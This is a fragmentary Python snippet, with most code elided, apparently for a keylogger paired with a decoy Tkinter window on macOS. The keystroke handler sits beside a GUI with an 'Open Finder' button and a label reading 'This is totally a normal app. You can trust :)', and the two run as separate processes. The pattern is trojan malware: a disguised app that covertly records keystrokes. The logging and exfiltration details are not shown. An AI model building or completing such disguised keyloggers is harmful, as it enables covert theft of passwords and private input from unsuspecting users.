...
def runlogger():
    ...
    def on_press(key):
        ...
        # if all(key in KILL_SWITCH for key in [Key.shift, KeyCode.from_char('`')]):
        #     switchactive = True
...
def rungui():
    def open_finder():
        # Open the home directory in Finder. Change path as needed.
        subprocess.call(["open", "-R", os.path.expanduser('~')])
    ...
    openFile = tk.Button(root, text="Open Finder", padx=25, pady=10, fg='white', bg="#263D42", command=open_finder)
    openFile.pack()

    # Adding a text label in the middle
    label = tk.Label(root, text="This is totally a normal app. You can trust :)", bg="black")
...
if __name__ == "__main__":
    ...
    gui_process = multiprocessing.Process(target=rungui)
